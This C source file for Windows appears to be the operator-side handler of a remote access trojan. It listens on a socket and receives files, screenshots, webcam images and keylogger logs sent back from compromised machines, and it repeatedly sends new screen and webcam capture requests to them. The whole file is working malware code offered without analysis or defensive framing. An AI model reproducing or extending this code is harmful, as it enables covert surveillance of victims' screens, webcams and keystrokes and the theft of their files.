#include "Main.h"
#include "PacketHead.h"
#include "resource.h"
#include "MyJPEGHandler.h"
////////////////////////////////////////////////////////////////////////////////////
//File Window Call back's
DWORD		DLSize = 0;
INT			F = 0;
bool InitiliseSocket(HWND hwnd)
{
	FSock = socket(AF_INET,SOCK_STREAM,0);
	WSAAsyncSelect(FSock,hwnd,RATMSG_SOCKET,FD_ACCEPT|FD_CLOSE|FD_READ);
	ServAdress.sin_family=AF_INET;
	ServAdress.sin_addr.s_addr=htonl(INADDR_ANY);
	ServAdress.sin_port=htons(1993);
	bind(FSock,(LPSOCKADDR)&ServAdress,sizeof(struct sockaddr));
	listen(FSock, 1);
	return TRUE;
}
LRESULT CALLBACK FileConnectProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
FBIPACKET DL;
//mystruct MS;
char FileName [100] = "";
int	i = 0;
int j = 0;
int Select = 0;
char FilePathA[256] = "";
HMODULE getmodh;
//LVBKIMAGE IBBkImg;
LV_ITEM	 item;
char Name [50] = "";
char Buffer [512] = "";
RECT rc;
WORD			FEvent;
HANDLE hFile;
LPSTR pszFileText;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
			if(InitiliseSocket(hwnd))		
			 {
	         }
			 else
			 {
		// MessageBox(NULL, "FAIL InitiliseSocket", "InitiliseSocket", MB_OK);
			 }/*
			 		getmodh = GetModuleHandle(NULL);
					GetModuleFileName(getmodh,me,sizeof(me));
			*/
			 DLSize = sizeof(FBIPACKET);
					
		break;
					 
	case RATMSG_SOCKET:
		FEvent=WSAGETSELECTEVENT(lParam);
		switch(FEvent)
		{
		case FD_CLOSE:
			break;
/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_ACCEPT:
			while(FClient[F] != NULL)
			{
			F++;
			}
			FClient[F]=accept(wParam,(LPSOCKADDR)&ServAdr,&AdrLen);
			break;
/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_READ:
			ZeroMemory(&DL, sizeof(FBIPACKET));
			recv(wParam,(char*)&DL,DLSize,0);
			switch(DL.PacketType)
			{
				
			case PACKET_FILE_MANAGER_FILE_RECV:
				if(DOWN[DL.ID2] == NULL)
				{
					//MessageBox(NULL, "cant find file", "FRecv.Data", MB_OK);
					break;
				}
				fwrite(DL.Data, DL.ID3, 1, DOWN[DL.ID2]);
					break;
			case PACKET_FILE_MANAGER_FILE_C:
				if(DOWN[DL.ID2] == NULL)
				{
					MessageBox(NULL, "cant find file", "FRecv.Data", MB_OK);
					break;
				}				
				fclose(DOWN[DL.ID2]);
				break;					
			case PACKET_FILE_MANAGER_FILE_UPDATE_WIN:
				item.mask=TVIF_TEXT;
				item.iItem=DL.ID3;
				
				item.iSubItem=2;
				item.pszText=DL.Data;
				ListView_SetItem(GetDlgItem(File[DL.ID],IDC_TRANSFER),&item);
				break;
			case SCREEN_SHOT_OPEN:
				SCREENDOWN[DL.ID] = fopen(DL.Data, "wb");
				SendMessage(GetDlgItem(Screen[DL.ID],IDC_PROGRESS1), PBM_SETRANGE32 , 0, DL.ID2);
				break;
			case SCREEN_SHOT_RECV:
				if(SCREENDOWN[DL.ID] == NULL)
				{
					//MessageBox(NULL, "cant find file", "FRecv.Data", MB_OK);
					break;
				}
				fwrite(DL.Data, DL.ID3, 1, SCREENDOWN[DL.ID]);
				SendMessage(GetDlgItem(Screen[DL.ID],IDC_PROGRESS1), PBM_SETPOS , (WPARAM)DL.ID2, 0);
				break;
			case SCREEN_SHOT_CLOSE:
				fclose(SCREENDOWN[DL.ID]);
				if(Screen[DL.ID] == NULL)
				{
					break;
				}
				SendMessage(GetDlgItem(Screen[DL.ID],IDC_PROGRESS1), PBM_SETPOS , (WPARAM)0, 0);
				GetClientRect(Screen[DL.ID], &rc);				
				ScreenA[DL.ID] = LoadJPEG(DL.Data);
				SetFocus (Screen[DL.ID]);
				InvalidateRect (Screen[DL.ID], NULL, FALSE);
				
				GetWindowText(GetDlgItem(Screen[DL.ID], IDC_SINGLESHOT), Buffer, 12);
				if(atoi(Buffer) == 1)
				{
				break;
				}
				else
				{
				GetWindowText(GetDlgItem(Screen[DL.ID], IDC_EDIT1), Buffer, 12);
				Sleep(atoi(Buffer));
				FBISend(Server[DL.ID], "", SendMessage(GetDlgItem(Screen[DL.ID], IDC_SLIDER1), TBM_GETPOS,NULL,NULL), rc.right - 20, rc.bottom - 20, SCREEN_CAPTURE);
				}
				DeleteFile(DL.Data);
				break;
			case WEBCAM_SHOT_OPEN:
				WEBDOWN[DL.ID] = fopen(DL.Data, "wb");
				SendMessage(GetDlgItem(Web[DL.ID],IDC_PROGRESS1), PBM_SETRANGE32 , 0, DL.ID2);
				break;
			case WEBCAM_SHOT_RECV:
				if(WEBDOWN[DL.ID] == NULL)
				{
					//MessageBox(NULL, "cant find file", "FRecv.Data", MB_OK);
					break;
				}
				fwrite(DL.Data, DL.ID3, 1, WEBDOWN[DL.ID]);
				SendMessage(GetDlgItem(Web[DL.ID],IDC_PROGRESS1), PBM_SETPOS , (WPARAM)DL.ID2, 0);
				break;
			case WEBCAM_SHOT_CLOSE:
				fclose(WEBDOWN[DL.ID]);
				if(Web[DL.ID] == NULL)
				{
				 break;
				}
				SendMessage(GetDlgItem(Web[DL.ID],IDC_PROGRESS1), PBM_SETPOS , (WPARAM)0, 0);
				GetClientRect(Web[DL.ID], &rc);				
				WebA[DL.ID] = LoadJPEG(DL.Data);
				SetFocus (Web[DL.ID]);
				InvalidateRect (Web[DL.ID], NULL, FALSE);
				
				GetWindowText(GetDlgItem(Web[DL.ID], IDC_SINGLESHOT), Buffer, 12);
				if(atoi(Buffer) == 1)
				{
					break;
				}
				else
				{
					GetWindowText(GetDlgItem(Screen[DL.ID], IDC_EDIT1), Buffer, 12);
					Sleep(atoi(Buffer));
					FBISend(Server[DL.ID], "", 0, rc.right, rc.bottom - 20, WEBCAM_CAPTURE);
				}
				GetWindowText(GetDlgItem(Web[DL.ID], IDC_ID), Buffer, 12);
				Sleep(atoi(Buffer));
				DeleteFile(DL.Data);
				break;
				
			case PACKET_KEYLOG_OPEN:
				Logs[DL.ID] = fopen(DL.Data, "wb");
				SendMessage(GetDlgItem(KeyHwnd[DL.ID],IDC_PROGRESSA), PBM_SETRANGE32 , 0, DL.ID2);
				SendMessage(GetDlgItem(KeyHwnd[DL.ID],IDC_PROGRESSA), PBM_SETPOS , (WPARAM)0, 0);
				//MessageBox(NULL, "CLIENT OPENED LOGS!", "LOLS", MB_OK);
				break;
			case PACKET_KEYLOG_OFFLINE:
				fclose(Logs[DL.ID]);
				SendMessage(GetDlgItem(Screen[DL.ID],IDC_PROGRESSA), PBM_SETPOS , (WPARAM)DL.ID2, 0);
				//  Set character formatting and background color
				SendMessage(GetDlgItem(KeyHwnd[DL.ID],IDC_MAIN_STATUS), SB_SETTEXT, 0, (LPARAM)"Logs Downloaded .");	
				hFile = CreateFile(DL.Data, GENERIC_READ, FILE_SHARE_READ, NULL,OPEN_EXISTING, 0, NULL);
				if(hFile != INVALID_HANDLE_VALUE)
				{
					DWORD dwFileSize;
					
					dwFileSize = GetFileSize(hFile, NULL);
					if(dwFileSize != 0xFFFFFFFF)
					{
						pszFileText = (char *)GlobalAlloc(GPTR, dwFileSize + 1);
						if(pszFileText != NULL)
						{
							DWORD dwRead;
							
							if(ReadFile(hFile, pszFileText, dwFileSize, &dwRead, NULL))
							{
								pszFileText[dwFileSize] = 0; // Add null terminator
								
								if(SetWindowText(GetDlgItem(KeyHwnd[DL.ID],IDC_OFFLINE), pszFileText))
								{
								}
								else
								{
									// MessageBox(NULL, "It did not work!", "Fail", MB_OK);	
								}
								
							}
							GlobalFree(pszFileText);
						}
					}
					CloseHandle(hFile);
				}
				
				break;
			case PACKET_KEYLOG_DOWNLOAD:
				fwrite(DL.Data, DL.ID3, 1, Logs[DL.ID]);
				SendMessage(GetDlgItem(Screen[DL.ID],IDC_PROGRESSA), PBM_SETPOS , (WPARAM)DL.ID2, 0);
				//sprintf(Buffer, "%d", Recv.ID2);
				//MessageBox(NULL, Buffer, "Buffer", MB_OK);
				 break;
			}
            break;
		}
	break;

	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{	
		case IDCANCEL:
			        EndDialog(hwnd,Select);
					break;
		}
		return TRUE;
	}
	return 0;
}

DWORD WINAPI FileConnectWindow(LPVOID lpParam)
{
	HWND Connect;
	Connect=CreateDialog(CInst,(LPCTSTR)IDD_CONNECT,NULL,(DLGPROC)FileConnectProc);
	ShowWindow(Connect,SW_HIDE);	
	MSG msg;
	while(GetMessage(&msg,Connect,0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	return 0;
}